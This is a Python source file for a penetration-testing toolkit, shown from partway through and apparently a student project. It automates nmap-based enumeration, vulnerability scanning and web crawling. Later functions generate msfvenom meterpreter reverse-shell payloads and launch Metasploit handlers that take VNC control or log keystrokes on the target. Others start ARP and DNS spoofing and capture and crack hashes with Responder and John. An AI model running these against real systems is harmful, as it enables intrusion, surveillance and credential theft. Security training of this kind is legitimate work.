                    ''', snmpProcessesList)
                    conn.commit()
                else:
                    print("Port 161 (SNMP) not opened, can't perform SNMP Enumeration")
    
#SNMP Software Enumeration
def snmp_software():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-sU -p 161')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
     
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    snmp = nmap.PortScanner()
                    snmp.scan(host, arguments='-sU -p 161 --script snmp-win32-software')
                    print(snmp[host][proto][port]['script']['snmp-win32-software'])
                    snmpSoftwareList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                                        str(snmp[host][proto][port]['script']['snmp-win32-software'])]
                    cur.execute('''
                    INSERT INTO APT.SNMP_Software_Enumeration (id, Host, Protocol, Port_Number, Port_Status, Softwares) VALUES (NULL, ?, ?, ?, ?, ?)
                    ''', snmpSoftwareList)
                    conn.commit()
                else:
                    print("Port 161 (SNMP) not opened, can't perform SNMP Enumeration")

#SNMP Interface Enumeration
def snmp_interface():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-sU -p 161')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
     
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    snmp = nmap.PortScanner()
                    snmp.scan(host, arguments='-sU -p 161 --script snmp-interfaces')
                    print(snmp[host][proto][port]['script']['snmp-interfaces'])
                    snmpInterfaceList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                    str(snmp[host][proto][port]['script']['snmp-interfaces'])]
                    cur.execute('''
                    INSERT INTO APT.SNMP_Interface_Enumeration (id, Host, Protocol, Port_Number, Port_Status, Interfaces) VALUES (NULL, ?, ?, ?, ?, ?)
                    ''', snmpInterfaceList)
                    conn.commit()
                else:
                    print("Port 161 (SNMP) not opened, can't perform SNMP Enumeration")


#SMTP Users Enumeration
def smtp_users():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-p 25')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
 
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    smtp = nmap.PortScanner()
                    smtp.scan(host, arguments='-p 25 --script smtp-enum-users')
                    print(smtp[host][proto][port]['script']['smtp-enum-users'])
                    smtpUsersList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                    str(smtp[host][proto][port]['script']['smtp-enum-users'])]
                    cur.execute('''
                    INSERT INTO APT.SMTP_User_Enumeration (id, Host, Protocol, Port_Number, Port_Status, Users) VALUES (NULL, ?, ?, ?, ?, ?)
                    ''', smtpUsersList)
                    conn.commit()
                else:
                    print("Port 25 (SMTP) not opened, can't perform SMTP Enumeration")

#NFS Share Enumeration
def nfs_share():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-p 2049')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)

            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    smtp = nmap.PortScanner()
                    smtp.scan(host, arguments='-sV -p 2049 --script nfs-showmount')
                    print("\nnfs-showmount:")
                    print(smtp[host][proto][port]['script']['nfs-showmount'])
                    nfsShareList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                    str(smtp[host][proto][port]['script']['nfs-showmount'])]
                    cur.execute('''
                    INSERT INTO APT.NFS_Share_Enumeration (id, Host, Protocol, Port_Number, Port_Status, Shares) VALUES (NULL, ?, ?, ?, ?, ?)
                    ''', nfsShareList)
                    conn.commit()
                else:
                    print("Port 2049 (NFS) not opened, can't perform NFS Enumeration")

#LDAP Information Enumeration
def ldap_info():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-sU -p 389')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
     
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    server = ldap3.Server(target, get_info=ldap3.ALL, port=389)
                    connection = ldap3.Connection(server)
                    connection.bind()
                    print(server.info)
                    ldapInfoList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                    str(server.info)]
                    cur.execute('''
                    INSERT INTO APT.LDAP_Information_Enumeration (id, Host, Protocol, Port_Number, Port_Status, Server_Info) VALUES (NULL, ?, ?, ?, ?, ?)
                    ''', ldapInfoList)
                    conn.commit()
                else:
                    print("Port 389 (LDAP) not opened, can't perform LDAP Enumeration")
#LDAP Users Enumeration
def ldap_users():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-sU -p 389')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
     
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    server = ldap3.Server(target, get_info=ldap3.ALL, port=389)
                    connection = ldap3.Connection(server)
                    connection.bind()
                    connection.search(search_base='DC=CEH,DC=com', 
                                      search_filter='(&(objectclass=person))')
                    print(connection.entries)
                    ldapUsersList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                    str(connection.entries)]
                    cur.execute('''
                    INSERT INTO APT.LDAP_Users_Enumeration (id, Host, Protocol, Port_Number, Port_Status, Connection_Entries) VALUES (NULL, ?, ?, ?, ?, ?)
                    ''', ldapUsersList)
                    conn.commit()
                else:
                    print("Port 389 (LDAP) not opened, can't perform LDAP Enumeration")

#LDAP Username Enumeration using LDAP Brute
def ldap_brute():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-p 389')
    dn = input("Enter Domain Name: ")
    tld = input("Enter Top Level Domain(eg. com, org): ")
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
     
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    ldap = nmap.PortScanner()
                    ldapBase = 'cn=users, dc=' + dn + ', dc=' + tld
                    print(ldapBase)

                    arguments = "-p 389 --script ldap-brute --script-args ldap.base=\'\"" + ldapBase +"\"\'"
                    ldap.scan(host, arguments=arguments)
                    ldap.scan("10.10.1.22", arguments='-p 389 --script ldap-brute --script-args ldap.base=\'"cn=users, dc=CEH, dc=com"\'')
                    print(ldap[host][proto][port]['script']['ldap-brute'])
                    ldapBruteList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                    str(ldap[host][proto][port]['script']['ldap-brute'])]
                    cur.execute('''
                    INSERT INTO APT.LDAP_Brute_Enumeration (id, Host, Protocol, Port_Number, Port_Status, ldap_brute) VALUES (NULL, ?, ?, ?, ?, ?)
                    ''', ldapBruteList)
                    conn.commit()
                else:
                    print("Port 389 (LDAP) not opened, can't perform LDAP Enumeration")


def googleSearch():
    toSearch = input("What do you want to search? ")
    print("\nResults:")
    for searchItem in search(toSearch, num=10, stop=10):
        print(searchItem)
        googleSearchList = [str(toSearch), str(searchItem)]
        cur.execute('''
        INSERT INTO APT.Google_Search (id, Search, Results) VALUES (NULL, ?, ?)
        ''', googleSearchList)
        conn.commit()

#Spidering / Crawling Domains
def spidering():
    url = str(input("Enter website to crawl here (e.g. https://www.np.edu.sg): "))
    max_urls = int(input("Enter maximum number of sub-domains to crawl here (Rec. 5): "))

    colorama.init()
    GREEN = colorama.Fore.GREEN
    GRAY = colorama.Fore.LIGHTBLACK_EX
    RESET = colorama.Fore.RESET
    YELLOW = colorama.Fore.YELLOW

    internal_urls = set()
    in_list = []
    SpideringList_in = []
    external_urls = set()
    SpideringList_ex = []
    ex_list = []

    def is_valid(url):
        parsed = urlparse(url)
        return bool(parsed.netloc) and bool(parsed.scheme)

    def get_all_website_links(url):
        urls = set()
        domain_name = urlparse(url).netloc
        soup = BeautifulSoup(requests.get(url).content, "html.parser")

        for a_tag in soup.findAll("a"):
            href = a_tag.attrs.get("href")
            if href == "" or href is None:
                continue

            href = urljoin(url, href)
            parsed_href = urlparse(href)
            href = parsed_href.scheme + "://" + parsed_href.netloc + parsed_href.path

            if not is_valid(href):
                continue
            if href in internal_urls:
                continue
            if domain_name not in href:
                if href not in external_urls:
                    ex_list.append(href)
                    print(f"{GRAY}[!] External link: {href}{RESET}")
                    external_urls.add(href)
                continue
            in_list.append(href)
            print(f"{GREEN}[*] Internal link: {href}{RESET}")
            urls.add(href)
            internal_urls.add(href)
        return urls

    def crawl(url, max_urls):
        global total_urls_visited
        total_urls_visited += 1
        print(f"{YELLOW}[*] Crawling: {url}{RESET}")
        links = get_all_website_links(url)
        for link in links:
            if total_urls_visited > max_urls:
                break
            crawl(link, max_urls=max_urls)

    if __name__ == "__main__":
        crawl(url,max_urls)
        while len(in_list) > len(ex_list):
            ex_list.append("NULL")
            continue
        pos = 0
        for i in in_list:
            Spiderman = [in_list[pos], ex_list[pos]]
            SpiderDB(Spiderman)
            pos += 1
        # with open('Spider.csv', 'w', newline='') as f:
        #     writer = csv.writer(f)
        #     writer.writerow(['Internal_URLS', 'External_URLs'])
        #     for i in in_list:
        #         Spiderman = [in_list[pos], ex_list[pos]]
        #         writer.writerow(Spiderman)
        #         pos += 1
        print("[+] Total Internal links:", len(internal_urls))
        print("[+] Total External links:", len(external_urls))
        print("[+] Total URLs:", len(external_urls) + len(internal_urls))

def whois_enum():
    import whois
    def get_ip_address(domain):
        try:
            ip_address = socket.gethostbyname(domain)
            return ip_address
        except socket.gaierror:
            print("Invalid domain or unable to resolve domain name.")
            sys.exit(1)

    def run_traceroute(ip_address):
        try:
            webb.traceroute("your-web-page-url")
        except subprocess.CalledProcessError:
            print("Failed to run traceroute.")

    def get_whois_info(domain):
        try:
            whois_info = whois.whois(domain)
            print(whois_info)
        except whois.parser.PywhoisError:
            print("Failed to retrieve WHOIS information.")

    def main():
        domain = input("Enter the domain name: ")

        # Get IP address
        ip_address = get_ip_address(domain)
        print("IP address: " + ip_address)


        # Get WHOIS information
        print("WHOIS information:")
        get_whois_info(domain)

        whoisEnumList = [str(ip_address), str(domain)]
        cur.execute('''
        INSERT INTO APT.Whois_Enumeration (id, Host, Domain) VALUES (NULL, ?,?)
        ''', whoisEnumList)
        conn.commit()

    if __name__ == "__main__":
        main()

def rpc_info():
    target = input("Enter IP address: ")
    nm = nmap.PortScanner()
    nm.scan(target, arguments='-p 111 --script rpcinfo')
    rpc_info = nm[target]['tcp'][111]['script']['rpcinfo']
    # Process the RPC information as needed
    print(rpc_info)
    rpcList = [str(target), str(rpc_info)]
    cur.execute('''
    INSERT INTO APT.RPC (id, Host, RPC_Info) VALUES (NULL, ?,?)
    ''', rpcList)
    conn.commit()

def packet_sniffer():
    def packet_callback(packet):
        packet.show()
        p = str(packet)
        print(plist)
        plist[3] = p
        print(plist)
        print(len(plist))
        cur.execute('''
            INSERT INTO APT.Packet_Sniffing (id, Interface, Timeout, Filter, Packet) VALUES (NULL, ?, ?, ?, ?)
            ''', plist)
        conn.commit()
        
    while True:

        try:
            plist = []
            interface = input("Enter network interface: ")
            plist.append(interface)
            capture = sniff(iface = interface, timeout = 0)
            break
        except OSError:
            print("Not a valid interface. Please try again.")
            
    while True:
        try:
            timeout = int(input("How long do you want to sniff for? (in seconds): "))
            plist.append(timeout)
            break
        except:
            print("Not a valid input. Please try again.")
    
    while True:
        try:
            toFilter = input("What do you want to filter? (eg. dst port ftp / icmp, or enter nothing for no filter): ")
            plist.append(toFilter)
            plist.append('test')
            capture = sniff(iface = interface, timeout = 0, filter = toFilter)
            break
        except:
            print("Failed to compile filter expression " + toFilter + '. Please try again.')


    
    if filter == "":
        capture = sniff(iface = interface, prn=packet_callback, timeout = timeout)
    else: 
        capture = sniff(iface = interface, prn=packet_callback, timeout = timeout, filter = toFilter)

def vulnerable_ports():
    target = input("Enter an IP Address to scan: ")
    port_range = input("Enter the range of ports to scan (eg. 1-1024, or enter nothing for no port range): ")
    scanner = nmap.PortScanner()
    if port_range == "":
        scanner.scan(target)
        for host in scanner.all_hosts():
            print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
 
            lport = scanner[host][proto].keys()
            print('Vulnerable Ports:')
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    new_port = (r'\b%s\b' % (str(port)))
                    with open('TCP_List.txt', 'r') as file:
                        contents = file.read()
                        matches = re.findall(new_port, contents)
                        if matches:
                            print('Vulnerable Ports:')
                            print ('port : %s\tstate : %s\tservice : %s'
                                % (port, scanner[host][proto][port]['state'], scanner[host][proto][port]['name']))
                            VulnerablePortsList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                            str(scanner[host][proto][port]['name'])]
                            cur.execute('''
                            INSERT INTO Vulnerable_Ports (id, Host, Protocol, Port_Number, Port_Status, Vulnerability) VALUES (NULL, ?, ?, ?, ?, ?)
                            ''', VulnerablePortsList)
                            conn.commit()

                                
    else:
        scanner.scan(target, port_range)
        for host in scanner.all_hosts():
            print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
 
            lport = scanner[host][proto].keys()
            print('Vulnerable Ports:')
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    new_port = (r'\b%s\b' % (str(port)))
                    with open('TCP_List.txt', 'r') as file:
                        contents = file.read()
                        matches = re.findall(new_port, contents)
                        if matches:
                            print ('port : %s\tstate : %s\tservice : %s'
                                % (port, scanner[host][proto][port]['state'], scanner[host][proto][port]['name']))
                            VulnerablePortsList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                            str(scanner[host][proto][port]['name'])]
                            cur.execute('''
                            INSERT INTO Vulnerable_Ports (id, Host, Protocol, Port_Number, Port_Status, Vulnerability) VALUES (NULL, ?, ?, ?, ?, ?)
                            ''', VulnerablePortsList)
                            conn.commit()
def dns_enum():
    # Set the target domain and record type
    target = input("Enter domain name: ")
    record_types = ["A", "AAAA", "CNAME", "MX", "NS", "SOA", "TXT"]
    # Create a DNS resolver
    dnsResolver = dns.resolver.Resolver()
    for record in record_types:
        # Perform DNS lookup for the specified domain and record type
        try:
            answers = dnsResolver.resolve(target, record)
        except dns.resolver.NoAnswer:
            continue
        # Print the answers
        print(f"{record} records for {target}:")
        for rdata in answers:
            print(f" {rdata}")
            dnsEnumerationList = [str(target), str({record}), str({rdata})]
            cur.execute('''
            INSERT INTO DNS_Enumeration (id, Domain, Record_Type, Data) VALUES (NULL, ?, ?, ?)
            ''', dnsEnumerationList)
            conn.commit()


def built_with():
    target = input("Enter target website: ")#https://juice-shop.herokuapp.com/#/
    website = builtwith.parse(target)
    for name in website:
        print(name + ":" , website[name])
        builtWithList = [str(website), str(name), str(website[name])]
        cur.execute('''
        INSERT INTO Built_With (id, Domain, Name, Language) VALUES (NULL, ?, ?, ?)
        ''', builtWithList)
        conn.commit()


def allowed_methods():
    target = input("Enter target website: ") #https://juice-shop.herokuapp.com/#/
    requestResponse = requests.options(target)
    for item in requestResponse.headers:
        print(item + ": " + requestResponse.headers[item])
        allowedMethodsList = [str(target), str(item), str(requestResponse.headers[item])]
        cur.execute('''
        INSERT INTO Allowed_Methods (id, Domain, Item, Result) VALUES (NULL, ?, ?, ?)
        ''', allowedMethodsList)
        conn.commit()


def start_openvas():
    print(subprocess.call('gvm-start', shell=True))

def start_openvas_scan():
    config = {
        'PORT_LIST_ID': '33d0cd82-57c6-11e1-8ed1-406186ea4fc5',
        'REPORT_FORMAT_ID': 'a994b278-1f62-11e1-96ac-406186ea4fc5',
        'SCAN_CONFIG_ID': 'daba56c8-73ec-11df-a475-002264764cea',
        'SCANNER_ID': '08b69003-5fc2-4037-a479-93b440211c73'
    }


    connection = UnixSocketConnection()
    transform = EtreeTransform()
    gmp = Gmp(connection, transform=transform)

    try:
        gmp.authenticate('admin', 'password')
    except:
        print("Not able to connect to OPENVAS")
    
    scan_name = input("Enter scan name: ")   
    host_address = input("Enter target address: ")   
    port_list_id = config['PORT_LIST_ID'] # For all IANA assigned TCP 
    target_response = gmp.create_target(name=scan_name, hosts=[host_address], port_list_id=port_list_id)
    target_id = target_response.get('id')

    if not target_id:
        print("Was unable to create target.", target_response.get('status_text'))
        return False
    else:
        print("Target created.")
    
    scan_config_id = config['SCAN_CONFIG_ID']
    scanner_id = config['SCANNER_ID']
    report_format_id = config['REPORT_FORMAT_ID']

    task_response = gmp.create_task(name=scan_name, config_id=scan_config_id, target_id=target_id, scanner_id=scanner_id)
    task_id = task_response.get('id')

    start_task_response = gmp.start_task(task_id)

    report_id = start_task_response[0].text
    print("Report created with Report ID: ", report_id)
    
def get_openvas_report():

    def check_status(task_name):
        report_filter = gmp.get_reports(filter_string=task_name)
        report = report_filter.find('report')
        report_id = report.get('id')
        report = gmp.get_report(report_id=report_id, filter_string="<scan_run_status>")
        file_name = task_name + "_status.xml"
        with open(file_name, 'wb') as file:
            file.write(ET.tostring(report, pretty_print=True))
            
        with open(file_name, 'r') as file:
            content = file.read()
            if str("<scan_run_status>Done</scan_run_status>") in content:
                print("Scan Completed.")
            else:
                print("Scan Still In Progress.")

    connection = UnixSocketConnection()
    transform = EtreeTransform()
    gmp = Gmp(connection, transform=transform)

    try:
        gmp.authenticate('admin', 'password')
    except:
        print("Not able to connect to OPENVAS")
        return False
    
    # Retrieve and get names of tasks
    tasks = gmp.get_tasks()
    
    task_names = tasks.xpath('task/name/text()')
    task_list = []
    for task in task_names:
        task_list.append(task)
    print("Tasks: ")
    pretty_print(task_names)
    
    task_name = input("Enter the task name of the task that you want to retrieve the report for: ")
    if task_name in task_list:
        task_name = re.sub(" ", "_", task_name)
        
        check_status(task_name)
        
        filter_report = gmp.get_reports(filter_string = task_name)
        report = filter_report.find('report')
        report_id = report.get('id')
        
        scan_results={}
        
        report_response = gmp.get_report(report_id, filter_string='apply_overrides=0 levels=hml min_qod=70 sort-reverse=severity')
        report_response_str = ET.tostring(report_response, encoding='unicode')
        report_response_dict = xmltodict.parse(report_response_str)
        
        report_results = report_response_dict.get('get_reports_response', {}).get('report', {}).get('report', {}).get('results', {}).get('result', [])
        try:
            for vuln in report_results:
                name = vuln.get('name')
        except:
            report_results = [report_results]
        for vuln in report_results:
            name = vuln.get('name')
            #print('name: ', name)
            if scan_results.get(name):
                #print('--- Duplicate name: ', name)
                continue
            nvt = vuln.get('nvt', {})
            scan_result = {}
            scan_result['name'] = name
            scan_result['severity'] = float(nvt.get('cvss_base', 0))
            scan_result['risk'] = vuln.get('threat')
            scan_result['description'] = vuln.get('description')
            scan_result['solution'] = nvt.get('solution')
     
            vuln = str(vuln)
            cve_codes = re.findall(r"CVE-\d{4}-\d+", vuln)
            cve_list = []
            for cve in cve_codes:
                if cve not in cve_list:
                    cve_list.append(cve)
            if not cve_list:
                cve_list.append("N/A")
                
            
            scan_result['cve_id'] = cve_list
            scan_results[name] = scan_result   
            
        def print_report(scan_results):

            if not scan_results:
                return False

            results = list(scan_results.values())

            scan_report = []
            scan_display_report = []
            scan_display_report.append([ '#', 'Vuln. Name', 'Risk', 'Severity', 'CVE ID' ])

            count = 0
            for vuln in sorted(results, key = lambda x: x['severity'], reverse=True):
                count += 1

                name =vuln['name']
                risk = vuln['risk']
                severity = vuln['severity']
                cve_id = vuln.get('cve_id') or vuln.get('cveid', '')
                description = vuln['description']
                solution = vuln['solution']

                scan_report.append([ count, name, risk, severity, cve_id, description, solution ])
                scan_display_report.append([ count, name, risk, severity, cve_id])
                
            with open('vulnerabilities.txt', 'w') as file:
                report_task_name = ("Task Name: " + task_name + "\n")
                file.write(report_task_name)
                for item in scan_report:
                    sn = ("#: "+ str(item[0]))
                    file.write(sn)
                    vuln_name = ("\nVulnerability Name: " + str(item[1]))
                    file.write(vuln_name)
                    risk = ("\nRisk: " + str(item[2]))  
                    file.write(risk)
                    severity = ("\nSeverity: " + str(item[3]))
                    file.write(str(severity))
                    cve = ("\nCVE ID: " + str(item[4]))
                    file.write(cve)
                    desc = ("\nDescription: " + str(item[5]))
                    file.write(desc)
                    for k,v in item[6].items():
                        solution = ("\nSolution: " + v)
                    file.write(solution)

                    file.write("\n")
                    file.write("\n")

                                        
                    vlist = [vuln_name, risk, severity, cve, desc, solution ]
                    print(vlist)
                    cur.execute('''
                    INSERT INTO OpenVAS (id, Vulnerability, Risk, Severity, CVE_ID, Description, Solution) VALUES (NULL, ?, ?, ?, ?, ?, ?)
                    ''', vlist)
                    conn.commit()
                    


            scan_report_table = SingleTable(scan_display_report)
            scan_report_table.title = 'Vuln. Alerts'
            print(scan_report_table.table)
            print("Detailed Report created at: vulnerabilities.txt")
        
        print_report(scan_results)
    else:
        print("Task not found")
        
def stop_openvas():
    print(subprocess.call("gvm-stop", shell=True))

def nikto_menu():

    host = 'https://redtiger.labs.overthewire.org/'

    os.system('apt-get nmap')
    os.system('apt-get nikto')
    os.system('nikto -update')
    

    print('For testing purposes')
    ntime = str(input('Enter runtime(s): '))

    nikto_loop = True
    while nikto_loop == True:
        ascii_nikto = pyfiglet.figlet_format("Nikto")
        print(ascii_nikto)
        print("\nPlease Select an Option Below.")
        print("1. Basic scan (HTTP)")
        print("2. Basic Scan (HTTPS)")
        print("3. Tuning Scan (Vulnerabilities Thingies)")
        print("4. Exit")

        menu_input = (input("Select option: "))
        if menu_input == "1":
            host = str(input('Enter domain name here (e.g. google.com):'))
            n80 =  subprocess.check_output(['nikto', '-h', host, '-nossl', '-maxtime', ntime])
            print(n80)
        elif menu_input == "2":
            host = str(input('Enter domain name here (e.g. google.com):'))
            n443 =  subprocess.check_output(['nikto', '-h', host, '-ssl', '-maxtime', ntime])
            print(n443)
        elif menu_input == "3":
            print('0. File Upload\n \
                3. Information Disclosure\n \
                4. Injection, XSS/Script/HTML\n \
                6. Denial of Service\n \
                8. Reverse Shell\n \
                9. SQL Injection\n \
                a. Authentication Bypass\n \
                b. Software Identification\n \
                c. Remote Source Inclusion\n ')
            value = str(input('Enter Tuning value to be used here: '))
            host = str(input('Enter domain name here (e.g. google.com):'))
            nT = subprocess.check_output(['nikto', '-h', host, '-Tuning', value])
            print(nT)
        elif menu_input == "4":
            nikto_loop = False
        else:
                print("Invalid Input!\nPlease Try Again!")
                continue

def create_html_pages():

    con = sqlite3.connect("APTdatabase.db")

    allowed_methods = pd.read_sql_query("SELECT * from Allowed_Methods", con)
    df_allowed = pd.DataFrame(data=allowed_methods)
    df_allowed.to_html("methods.html",justify='left')

    built_with = pd.read_sql_query("SELECT * from Built_With", con)
    df_built = pd.DataFrame(data=built_with)
    df_built.to_html("built_with.html",justify='left')

    dns = pd.read_sql_query("SELECT * from DNS_Enummeration", con)
    df_dns = pd.DataFrame(data=dns)
    df_dns.to_html("dns.html",justify='left')

    google = pd.read_sql_query("SELECT * from Google_Search", con)
    df_google = pd.DataFrame(data=google)
    df_google.to_html("google.html",justify='left')

    host = pd.read_sql_query("SELECT * from HostDiscovery", con)
    df_host = pd.DataFrame(data=host)
    df_host.to_html("host.html",justify='left')

    ldap_brute = pd.read_sql_query("SELECT * from LDAP_Brute_Enummeration", con)
    df_ldapbrute = pd.DataFrame(data=ldap_brute)
    df_ldapbrute.to_html("ldap_brute.html",justify='left')

    ldap_users = pd.read_sql_query("SELECT * from LDAP_Users_Enummeration", con)
    df_ldapusers = pd.DataFrame(data=ldap_users)
    df_ldapusers.to_html("ldap_users.html",justify='left')

    nfs = pd.read_sql_query("SELECT * from NFS_Share_Enummeration", con)
    df_nfs = pd.DataFrame(data=nfs)
    df_nfs.to_html("nfs.html",justify='left')

    os = pd.read_sql_query("SELECT * from OSDiscovery", con)
    df_os = pd.DataFrame(data=os)
    df_os.to_html("os.html",justify='left')

    port = pd.read_sql_query("SELECT * from PortDiscovery", con)
    df_port = pd.DataFrame(data=port)
    df_port.to_html("port.html",justify='left')

    rpc = pd.read_sql_query("SELECT * from RPC", con)
    df_rpc = pd.DataFrame(data=rpc)
    df_rpc.to_html("rpc.html",justify='left')

    smtp_users = pd.read_sql_query("SELECT * from SMTP_User_Enummeration", con)
    df_smtpusers = pd.DataFrame(data=smtp_users)
    df_smtpusers.to_html("smtp_users.html",justify='left')

    snmp_interface = pd.read_sql_query("SELECT * from SNMP_Interface_Enummeration", con)
    df_snmpinterface = pd.DataFrame(data=snmp_interface)
    df_snmpinterface.to_html("snmp_interface.html",justify='left')

    snmp_os = pd.read_sql_query("SELECT * from SNMP_OS_Enummeration", con)
    df_snmpos = pd.DataFrame(data=snmp_os)
    df_snmpos.to_html("snmp_os.html",justify='left')

    snmp_process = pd.read_sql_query("SELECT * from SNMP_Process_Enummeration", con)
    df_snmpprocess = pd.DataFrame(data=snmp_process)
    df_snmpprocess.to_html("snmp_process.html",justify='left')

    snmp_software = pd.read_sql_query("SELECT * from SNMP_Software_Enummeration", con)
    df_snmpsoftware = pd.DataFrame(data=snmp_software)
    df_snmpsoftware.to_html("snmp_software.html",justify='left')

    spidering = pd.read_sql_query("SELECT * from Spidering", con)
    df_spidering = pd.DataFrame(data=spidering)
    df_spidering.to_html("spidering.html",justify='left')

    vuln_ports = pd.read_sql_query("SELECT * from Vulnerable_Ports", con)
    df_vulnports = pd.DataFrame(data=vuln_ports)
    df_vulnports.to_html("vuln_ports.html",justify='left')

    whois = pd.read_sql_query("SELECT * from Whois_Enummeration", con)
    df_whois = pd.DataFrame(data=whois)
    df_whois.to_html("whois.html",justify='left')

def arp_spoof():
    arp_spoof = subprocess.Popen(['gnome-terminal', '-e', 'bash -c "python3 arp-spoof.py; exec bash"'])


def dns_spoof():
    dns_spoof = subprocess.Popen(['gnome-terminal', '-e', 'bash -c "python3 dns-spoof.py; exec bash"'])

def generate_vnc_payload():
    lhost = input("IP Address of this machine: ")
    subprocess.call("msfvenom -p windows/meterpreter/reverse_tcp \
    --platform windows -a x86 -f exe LHOST={} LPORT=444 -o Payloads/vnc_exploit.exe".format(lhost), 
    shell=True)

def vnc_exploit():
    # Set exploit variables
    exploit = "exploit/multi/handler"
    payload = "windows/meterpreter/reverse_tcp"
    lhost = input("IP Address of this machine: ")
    lport = "444"
    sleep = input("How long do you want to listen for (in seconds)? ")
    
    # Run msfconsole in new terminal
    process = subprocess.Popen(['gnome-terminal', '-e', 'msfconsole -x "use {}; \
    set PAYLOAD {}; \
    set LHOST {}; \
    set LPORT {}; \
    exploit -j -z; \
    sleep {}; \
    sessions -i 1 -C \\"run vnc\\""'.format(exploit, payload, lhost, lport, sleep)])

def generate_keyscan_payload():
    lhost = input("IP Address of this machine: ")
    subprocess.call('msfvenom -p windows/meterpreter/reverse_tcp \
    --platform windows -a x86 -e x86/shikata_ga_nai -b "\\x00" LHOST={} -f exe > Payloads/keyscan_exploit.exe'.format(lhost), 
    shell=True)
    print("Saved as: Payloads/keyscan_exploit.exe")

def keyscan_exploit():
    open('keyscan.txt', 'w')
    # Set exploit variables
    
    exploit = "exploit/multi/handler"
    payload = "windows/meterpreter/reverse_tcp"
    lhost = input("IP Address of this machine: ")
    lport = "444"
    listen_sleep = input("How long do you want to listen for (in seconds)? ")
    keyscan_sleep = input("How long do you want to run the keyscan for (in seconds)? ")
    
    # Run msfconsole in new terminal
    process = subprocess.Popen(['gnome-terminal', '-e', 'msfconsole -x "use {}; \
    set PAYLOAD {}; \
    set LHOST {}; \
    set LPORT {}; \
    exploit -j -z; \
    sleep {}; \
    sessions -i 1 -C \\"load stdapi\\"; \
    sessions -i 1 -C \\"keyscan_start\\"; \
    sleep {}; \
    spool keyscan.txt; \
    sessions -i 1 -C \\"keyscan_dump\\"; \
    spool off"'.format(exploit, payload, lhost, lport, listen_sleep, keyscan_sleep)])
    
    
    input("Press Enter once keyscan is done ")
    # Open the text file
    with open("keyscan.txt", "r") as file:
        content = file.read()
        
    #ip_address = re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', content).group()
    #print("\nTarget Machine: ", ip_address)

    # Remove color codes using regular expressions
    clean_content = re.sub(r'\\[\d+m', '', content)

    # Print the clean content
    print(clean_content)
    
    with open("keyscan.txt", "w") as file:
        file.write(clean_content)

def start_listener():
    interface_name = input("Enter interface: ")
    start_listener = subprocess.Popen(['gnome-terminal', '-e', 'bash -c "python2 Responder/Responder.py -I {}; exec bash"'.format(interface_name)])

def crack_hash_generated():
    hash_file = input("Input name of hash file: ")
    remove_rec_file = subprocess.call("rm /root/.john/john.rec", shell = True)
    start_listener = subprocess.call(['gnome-terminal', '-e', 'bash -c "john Responder/logs/{}; exec bash"'.format(hash_file)])

def zap_scan():
    zap_command = "/usr/share/zaproxy/zap.sh -config api.key=test"
    subprocess.Popen(['gnome-terminal','--command',zap_command])
    print("If a window opens saying 'Do you want to persist the ZAP Session?', please select 'No, I do not want to persist this session at this moment in time' and press start")
